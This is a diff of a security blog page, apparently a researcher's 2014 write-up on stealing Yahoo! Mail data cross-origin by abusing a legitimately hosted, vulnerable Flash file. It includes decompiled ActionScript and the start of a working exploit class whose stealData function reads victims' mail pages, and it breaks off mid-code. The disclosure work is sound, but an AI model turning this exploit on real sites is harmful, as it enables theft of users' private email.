@@ -27,22 +27,22 @@
   <script src="/javascripts/libs/jquery.min.js" type="text/javascript" defer></script>
   <script src="/javascripts/octopress.js" type="text/javascript" defer></script>
   <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
-<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
-<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
 
-  
   <script type="text/javascript">
-    var _gaq = _gaq || [];
-    _gaq.push(['_setAccount', 'UA-47846401-1']);
-    _gaq.push(['_trackPageview']);
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-47846401-1']);
+  _gaq.push(['_trackPageview']);
 
-    (function() {
-      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-    })();
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
   </script>
 
+  
 
 </head>
 
@@ -97,7 +97,8 @@
   
 
 
-<time datetime="2014-12-09T03:56:01-08:00" pubdate data-updated="true"><time class='entry-date' datetime='2014-12-09T03:56:01-08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:56 am</span></time></time>
+
+<time datetime="2014-12-09T03:56:01-08:00" pubdate data-updated="true"><time class='entry-date' datetime='2014-12-09T03:56:01-08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span></time></time>
         
       </p>
     
@@ -106,13 +107,28 @@
 
 <div class="entry-content"><p><em>This is a follow-up to another article about crossorigin mail theft on Yahoo! Mail using Flash. For a better understanding of the issue, you can read that here: <a href="http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/">http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/</a></em></p>
 
+
+
+
 <h2>TL;DR</h2>
+
+
+
 
 <p>A .swf on Yahoo&rsquo;s CDN had a vulnerability that enabled near-complete control over Yahoo! Mail crossorigin. The .swf itself is fixed, but the configuration issue that allowed a .swf completely unrelated to Yahoo! Mail to do something like that still exists.</p>
 
+
+
+
 <h2>The Issue</h2>
 
+
+
+
 <p>So, in the last article we established that YMail&rsquo;s <code>crossdomain.xml</code> rules are incredibly lax:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -120,23 +136,39 @@
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
 </pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;crossorigin-policy&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;*.yahoo.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;l.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;s.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;*.yahoo.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;l.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;s.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
 </span><span class='line'><span class="nt">&lt;/crossorigin-policy&gt;</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
+
+
 <p>They allow .swfs on any subdomain of <code>yahoo.com</code> to read resources on YMail crossorigin. Last time we abused a crossorigin proxy on <code>hk.promotions.yahoo.com</code> to serve up our own .swf that would request pages from YMail and leak them back to us. The crossorigin proxy has since been patched, but the loose <code>crossdomain.xml</code> rules remain. Assuming there&rsquo;s no way for us to serve our own .swf through <code>yahoo.com</code> anymore, how can we exploit these rules without using MITM attacks? Well, we abuse vulnerabilities in .swfs that are <em>legitimately</em> hosted on subdomains of <code>yahoo.com</code>.</p>
 
+
+
+
 <p>Let&rsquo;s look for a .swf that will allow us to make arbitrary requests, and read the response. With a little searching we find a good candidate, <a href="https://sp.yimg.com/dv/i/izmo/engine/hotspotgallery/hotspotgallery.swf">hotspotgallery.swf</a>, related to a feature on Yahoo! Autos that gives 3D tours of cars. Normally it&rsquo;s served up on <code>sp.yimg.com</code>, which isn&rsquo;t a domain allowed by YMail&rsquo;s <code>crossdomain.xml</code>, but with a little finagling we find that the same .swf <a href="http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf">can also be accessed on img.autos.yahoo.com</a>.</p>
+
+
+
 
 <!--more-->
 
 
+
+
 <p><a href="/images/posts/ymail_again/hotspotgallery.png"><img class="center" src="/images/posts/ymail_again/thumbs/hotspotgallery.jpg" width="640" height="480"></a></p>
 
+
+
+
 <p>Let&rsquo;s take a peek at <a href="https://gist.github.com/JordanMilne/145722dd2ca31bc96f86">the ActionScript from the decompiler</a> to see why this .swf is useful to us:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -147,17 +179,25 @@
 <span class='line-number'>7</span>
 </pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">public</span> <span class="kd">dynamic</span> <span class="kd">class</span> <span class="nx">MainTimeline</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span>
 </span><span class='line'>    <span class="c1">// ... snip</span>
-</span><span class='line'>    <span class="kd">function</span> <span class="nx">frame1</span><span class="p">(){</span>
-</span><span class='line'>        <span class="nb">Security</span><span class="p">.</span><span class="nx">allowDomain</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">);</span>
-</span><span class='line'>        <span class="c1">// ... snip</span>
-</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>  <span class="kd">function</span> <span class="nx">frame1</span><span class="p">(){</span>
+</span><span class='line'>      <span class="nb">Security</span><span class="p">.</span><span class="nx">allowDomain</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="c1">// ... snip</span>
+</span><span class='line'>  <span class="p">}</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Immediately we notice the <code>Security.allowDomain("*")</code>, which is usually not a good sign. The reason for that is Flash has a feature where you can embed a crossorigin .swf inside your own. You can access and call the public members of the embedded .swf&rsquo;s <code>MovieClip</code> object, but normally this is disallowed unless the embedding .swf is same-origin with it. </p>
 
-<p><code>Security.allowDomain()</code> allows you to relax that restriction for specific domains, and this .swf is saying .swfs from <em>any</em> domain can access its <code>MovieClip</code>&rsquo;s public members. <code>Security.allowDomain("*")</code> isn&rsquo;t necessarily a security issue on its own, unless your .swf&rsquo;s public members do or store something security sensitive. Now, this .swf <em>is</em> vulnerable, and to see why we&rsquo;ll look at the <code>loadXML2()</code> method:</p>
+
+<p>Immediately we notice the <code>Security.allowDomain("*")</code>, which is usually not a good sign. The reason for that is Flash has a feature where you can embed a crossorigin .swf inside your own. You can access and call the public members of the embedded .swf&rsquo;s <code>MovieClip</code> object, but normally this is disallowed unless the embedding .swf is same-origin with it. </p>
+
+
+
+
+<p><code>Security.allowDomain()</code> allows you to relax that restriction for specific domains, and this .swf is saying .swfs from <em>any</em> domain can access its <code>MovieClip</code>&rsquo;s public members. <code>Security.allowDomain("*")</code> isn&rsquo;t necessarily a security issue on its own, unless your .swf&rsquo;s public members do or store something security sensitive. Now, this .swf <em>is</em> vulnerable, and to see why we&rsquo;ll look at the <code>loadXML2()</code> method:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -187,10 +227,10 @@
 <span class='line-number'>26</span>
 <span class='line-number'>27</span>
 </pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">public</span> <span class="kd">dynamic</span> <span class="kd">class</span> <span class="nx">MainTimeline</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span>
-</span><span class='line'>    <span class="kd">public</span> <span class="k">var</span> <span class="nx">exteriorXML</span><span class="o">:</span><span class="nb">String</span><span class="o">;</span>
-</span><span class='line'>    <span class="kd">public</span> <span class="k">var</span> <span class="nx">DATA3</span><span class="o">:</span><span class="nb">XML</span><span class="o">;</span>
-</span><span class='line'>    <span class="kd">public</span> <span class="k">var</span> <span class="nx">dataPath</span><span class="o">;</span>
-</span><span class='line'>    <span class="c1">// ... snip</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="k">var</span> <span class="nx">exteriorXML</span><span class="o">:</span><span class="nb">String</span><span class="o">;</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="k">var</span> <span class="nx">DATA3</span><span class="o">:</span><span class="nb">XML</span><span class="o">;</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="k">var</span> <span class="nx">dataPath</span><span class="o">;</span>
+</span><span class='line'>  <span class="c1">// ... snip</span>
 </span><span class='line'>    <span class="kd">public</span> <span class="kd">function</span> <span class="nx">loadXML2</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
 </span><span class='line'>        <span class="k">var</span> <span class="nx">ldr</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
 </span><span class='line'>        <span class="k">var</span> <span class="nx">loader_IO_ERROR</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
@@ -216,9 +256,17 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>As you can see, the code makes a request to <code>this.dataPath</code> concatenated with <code>this.exteriorXML1</code>.  When it gets a response, it parses it as XML, and stores the result in <code>this.DATA3</code>. But we control all 3 of those members due to the <code>public</code> access modifiers and <code>Security.allowDomain("*")</code>, and can both read from <em>and</em> write to them from .swfs on our own domain. Given that we control the URL requested, can read the response, and can trigger the behaviour at will, all from a crossorigin Flash document, we&rsquo;ve got crossorigin data leakage!</p>
+
+
+<p>As you can see, the code makes a request to <code>this.dataPath</code> concatenated with <code>this.exteriorXML1</code>.  When it gets a response, it parses it as XML, and stores the result in <code>this.DATA3</code>. But we control all 3 of those members due to the <code>public</code> access modifiers and <code>Security.allowDomain("*")</code>, and can both read from <em>and</em> write to them from .swfs on our own domain. Given that we control the URL requested, can read the response, and can trigger the behaviour at will, all from a crossorigin Flash document, we&rsquo;ve got crossorigin data leakage!</p>
+
+
+
 
 <p>Well&hellip; with a few caveats:</p>
+
+
+
 
 <ul>
 <li>The target endpoint must respond to <code>GET</code>s</li>
@@ -228,11 +276,19 @@
 </ul>
 
 
+
+
 <h2>First Steps</h2>
+
+
+
 
 <p>Let&rsquo;s start by making some ActionScript to embed and exploit <code>hotspotgallery.swf</code>. From here on you will need to be logged in to Yahoo! for some links to work. Here we&rsquo;ve got a very simple JS<->Flash proxy in the style of CrossXHR. It loads up the vulnerable .swf, sets its public members so it&rsquo;ll request the resource we want to leak, then returns the response back to JS:</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -332,150 +388,215 @@
 <span class='line-number'>98</span>
 <span class='line-number'>99</span>
 <span class='line-number'>100</span>
-</pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">package</span> <span class="p">{</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">display</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">events</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">external</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">net</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">system</span><span class="p">.</span><span class="o">*;</span>
+</pre></td><td class='code'><pre><code class='as3'><span class='line'><span class="kd">package</span> <span class="o">{</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.display.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.events.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.external.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.net.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.text.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.utils.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.system.</span><span class="o">*;</span>
 </span><span class='line'>
-</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nx">YahooFlasher</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="n">YahooFlasher</span> <span class="kd">extends</span> <span class="n">MovieClip</span> <span class="o">{</span>
 </span><span class='line'>
 </span><span class='line'>    <span class="c1">// Vulnerable SWF to make our requests through</span>
-</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nx">PROXY_URL</span><span class="o">:</span><span class="nb">String</span> <span class="o">=</span> <span class="s2">&quot;http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf&quot;</span><span class="o">;</span>
+</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="n">PROXY_URL</span><span class="p">:</span><span class="kt">String</span> <span class="o">=</span> <span class="s2">&quot;http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf&quot;</span><span class="o">;</span>
 </span><span class='line'>
 </span><span class='line'>    <span class="c1">// Get just the origin from a fully-qualified URL</span>
-</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nx">ORIGIN_REGEX</span><span class="o">:</span><span class="nb">RegExp</span> <span class="o">=</span> <span class="sr">/^(\w+:\/\/[^\/]+\/).*/</span><span class="o">;</span>
+</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="n">ORIGIN_REGEX</span><span class="p">:</span><span class="kt">RegExp</span> <span class="o">=</span> <span class="sr">/^(\w+:\/\/[^\/]+\/).*/</span><span class="o">;</span>
 </span><span class='line'>
-</span><span class='line'>    <span class="kd">public</span> <span class="kd">function</span> <span class="nx">YahooFlasher</span><span class="p">()</span> <span class="p">{</span>
-</span><span class='line'>        <span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">ADDED_TO_STAGE</span><span class="o">,</span> <span class="nx">onAdded</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">function </span><span class="nf">YahooFlasher</span><span class="o">()</span> <span class="o">{</span>
+</span><span class='line'>        <span class="n">addEventListener</span><span class="o">(</span><span class="n">Event</span><span class="o">.</span><span class="na">ADDED_TO_STAGE</span><span class="o">,</span> <span class="n">onAdded</span><span class="o">);</span>
+</span><span class='line'>    <span class="o">}</span>
 </span><span class='line'>
-</span><span class='line'>    <span class="kd">private</span> <span class="kd">function</span> <span class="nx">onAdded</span><span class="p">(</span><span class="nx">e</span><span class="o">:</span><span class="nb">Event</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">private</span> <span class="kd">function </span><span class="nf">onAdded</span><span class="o">(</span><span class="n">e</span><span class="o">:</span><span class="kt">Event</span><span class="o">):</span><span class="kt">void</span> <span class="o">{</span>
 </span><span class='line'>        <span class="c1">// Set timeout to avoid syncronous issues</span>
-</span><span class='line'>        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
-</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">available</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">setTimeout</span><span class="o">(</span><span class="kd">function</span><span class="o">():</span><span class="kc">void</span> <span class="o">{</span>
+</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">ExternalInterface</span><span class="o">.</span><span class="na">available</span><span class="o">)</span> <span class="o">{</span>
 </span><span class='line'>                <span class="c1">// Let&#39;s not make *ourselves* vulnerable to weird exploits.</span>
-</span><span class='line'>                <span class="k">var</span> <span class="nx">swfOrigin</span><span class="o">:</span><span class="nb">String</span> <span class="o">=</span> <span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">ORIGIN_REGEX</span><span class="o">,</span> <span class="s2">&quot;$1&quot;</span><span class="p">);</span>
-</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ORIGIN_REGEX</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">swfOrigin</span><span class="p">)</span> <span class="o">||</span> <span class="nx">swfOrigin</span> <span class="o">!=</span> <span class="nb">Security</span><span class="p">.</span><span class="nx">pageDomain</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>                    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="s2">&quot;alert&quot;</span><span class="o">,</span> <span class="s2">&quot;AY! This .swf needs to be on the same page as the one embedding it!&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="kd">var</span> <span class="n">swfOrigin</span><span class="p">:</span><span class="kt">String</span> <span class="o">=</span> <span class="n">loaderInfo</span><span class="o">.</span><span class="na">url</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="n">ORIGIN_REGEX</span><span class="o">,</span> <span class="s2">&quot;$1&quot;</span><span class="o">);</span>
+</span><span class='line'>                <span class="k">if</span><span class="o">(!</span><span class="n">ORIGIN_REGEX</span><span class="o">.</span><span class="na">test</span><span class="o">(</span><span class="n">swfOrigin</span><span class="o">)</span> <span class="o">||</span> <span class="n">swfOrigin</span> <span class="o">!=</span> <span class="n">Security</span><span class="o">.</span><span class="na">pageDomain</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="s2">&quot;alert&quot;</span><span class="o">,</span> <span class="s2">&quot;AY! This .swf needs to be on the same page as the one embedding it!&quot;</span><span class="o">);</span>
 </span><span class='line'>                    <span class="k">return</span><span class="o">;</span>
-</span><span class='line'>                <span class="p">}</span>
-</span><span class='line'>                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">&quot;stealData&quot;</span><span class="o">,</span> <span class="nx">stealData</span><span class="p">);</span>
-</span><span class='line'>                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="s2">&quot;flasherReady&quot;</span><span class="p">);</span>
-</span><span class='line'>            <span class="p">}</span>
-</span><span class='line'>        <span class="p">}</span><span class="o">,</span> <span class="mi">1</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>                <span class="o">}</span>
+</span><span class='line'>                <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">addCallback</span><span class="o">(</span><span class="s2">&quot;stealData&quot;</span><span class="o">,</span> <span class="n">stealData</span><span class="o">);</span>
+</span><span class='line'>                <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="s2">&quot;flasherReady&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="o">}</span>
+</span><span class='line'>        <span class="o">},</span> <span class="mi">1</span><span class="o">);</span>
+</span><span class='line'>    <span class="o">}</span>
 </span><span class='line'>
-</span><span class='line'>    <span class="kd">public</span> <span class="kd">function</span> <span class="nx">stealData</span><span class="p">(</span><span class="nx">targetURL</span><span class="o">:</span><span class="nb">String</span><span class="o">,</span> <span class="nx">callback</span><span class="o">:</span><span class="nb">String</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">function </span><span class="nf">stealData</span><span class="o">(</span><span class="n">targetURL</span><span class="o">:</span><span class="kt">String</span><span class="o">,</span> <span class="n">callback</span><span class="o">:</span><span class="kt">String</span><span class="o">):</span><span class="kt">void</span> <span class="o">{</span>
 </span><span class='line'>        <span class="c1">///</span>
 </span><span class='line'>        <span class="c1">/// Steal data through the proxy SWF, response body must look like</span>
 </span><span class='line'>        <span class="c1">/// valid XML and status code must not be &gt;= 400.</span>
 </span><span class='line'>        <span class="c1">///</span>
-</span><span class='line'>        <span class="k">var</span> <span class="nx">ldrComplete</span><span class="o">:</span><span class="nb">Function</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">_arg1</span><span class="o">:</span><span class="nb">Event</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
-</span><span class='line'>            <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
-</span><span class='line'>                <span class="k">var</span> <span class="nx">proxyClip</span><span class="o">:</span><span class="nb">Object</span> <span class="o">=</span> <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">content</span><span class="o">;</span>
+</span><span class='line'>        <span class="kd">var</span> <span class="n">ldrComplete</span><span class="p">:</span><span class="kt">Function</span> <span class="o">=</span> <span class="kd">function</span> <span class="o">(</span><span class="n">_arg1</span><span class="o">:</span><span class="n">Event</span><span class="o">):</span><span class="kc">void</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">setTimeout</span><span class="o">(</span><span class="kd">function</span><span class="o">():</span><span class="kc">void</span><span class="o">{</span>
+</span><span class='line'>                <span class="kd">var</span> <span class="n">proxyClip</span><span class="p">:</span><span class="kt">Object</span> <span class="o">=</span> <span class="n">MCLoader</span><span class="o">.</span><span class="na">content</span><span class="o">;</span>
 </span><span class='line'>
 </span><span class='line'>                <span class="c1">// This thing&#39;s all janked and the request will be made to dataPath + &quot;/&quot; + exteriorXML1.</span>
 </span><span class='line'>                <span class="c1">// Try to make it so that this won&#39;t affect our target.</span>
-</span><span class='line'>                <span class="k">var</span> <span class="nx">splitURL</span><span class="o">:</span><span class="nb">Array</span> <span class="o">=</span> <span class="nx">targetURL</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
-</span><span class='line'>                <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">dataPath</span> <span class="o">=</span> <span class="nx">splitURL</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
-</span><span class='line'>                <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">exteriorXML1</span> <span class="o">=</span> <span class="nx">splitURL</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'>                <span class="kd">var</span> <span class="n">splitURL</span><span class="p">:</span><span class="kt">Array</span> <span class="o">=</span> <span class="n">targetURL</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s1">&#39;/&#39;</span><span class="o">);</span>
+</span><span class='line'>                <span class="n">proxyClip</span><span class="o">.</span><span class="na">dataPath</span> <span class="o">=</span> <span class="n">splitURL</span><span class="o">.</span><span class="na">shift</span><span class="o">();</span>
+</span><span class='line'>                <span class="n">proxyClip</span><span class="o">.</span><span class="na">exteriorXML1</span> <span class="o">=</span> <span class="n">splitURL</span><span class="o">.</span><span class="na">join</span><span class="o">(</span><span class="s1">&#39;/&#39;</span><span class="o">);</span>
 </span><span class='line'>
 </span><span class='line'>                <span class="c1">// Triggers the HTTP Request through the vulnerable SWF</span>
-</span><span class='line'>                <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">loadXML2</span><span class="p">();</span>
+</span><span class='line'>                <span class="n">proxyClip</span><span class="o">.</span><span class="na">loadXML2</span><span class="o">();</span>
 </span><span class='line'>
-</span><span class='line'>                <span class="k">var</span> <span class="nx">timeLimit</span><span class="o">:</span><span class="nb">Number</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">+</span> <span class="mi">10000</span><span class="o">;</span>
+</span><span class='line'>                <span class="kd">var</span> <span class="n">timeLimit</span><span class="p">:</span><span class="kt">Number</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">Date</span><span class="o">().</span><span class="n">getTime</span><span class="o">()</span> <span class="o">+</span> <span class="mi">10000</span><span class="o">;</span>
 </span><span class='line'>
 </span><span class='line'>                <span class="c1">// Keep checking if the data&#39;s been loaded,</span>
 </span><span class='line'>                <span class="c1">// If `new XML(response)` raises, this will never be true,</span>
 </span><span class='line'>                <span class="c1">// the response has to look like valid XML, but most JSON</span>
 </span><span class='line'>                <span class="c1">// resources work too. Maybe because it sees it as one big </span>
 </span><span class='line'>                <span class="c1">// top-level TextNode?</span>
-</span><span class='line'>                <span class="kd">function</span> <span class="nx">checkFinished</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
-</span><span class='line'>                    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
-</span><span class='line'>                        <span class="k">var</span> <span class="nx">stolenXML</span><span class="o">:</span><span class="nb">XML</span> <span class="o">=</span> <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">DATA3</span><span class="o">;</span>
-</span><span class='line'>                        <span class="k">if</span><span class="p">(</span><span class="nx">stolenXML</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>                            <span class="k">var</span> <span class="nx">ret</span><span class="o">:</span><span class="nb">String</span><span class="o">;</span>
+</span><span class='line'>                <span class="kd">function </span><span class="nf">checkFinished</span><span class="o">():</span><span class="kt">void</span> <span class="o">{</span>
+</span><span class='line'>                    <span class="n">setTimeout</span><span class="o">(</span><span class="kd">function</span><span class="o">():</span><span class="kc">void</span> <span class="o">{</span>
+</span><span class='line'>                        <span class="kd">var</span> <span class="n">stolenXML</span><span class="p">:</span><span class="kt">XML</span> <span class="o">=</span> <span class="n">proxyClip</span><span class="o">.</span><span class="na">DATA3</span><span class="o">;</span>
+</span><span class='line'>                        <span class="k">if</span><span class="o">(</span><span class="n">stolenXML</span> <span class="o">!==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>                            <span class="kd">var</span> <span class="n">ret</span><span class="p">:</span><span class="kt">String</span><span class="o">;</span>
 </span><span class='line'>                            <span class="c1">// If we get a simple node with no name, it&#39;s probably not even XML.</span>
 </span><span class='line'>                            <span class="c1">// Get the string representation without XML escaping.</span>
-</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="nx">stolenXML</span><span class="p">.</span><span class="nx">name</span><span class="p">()</span> <span class="o">||</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">hasComplexContent</span><span class="p">())</span>
-</span><span class='line'>                                <span class="nx">ret</span> <span class="o">=</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">toXMLString</span><span class="p">();</span>
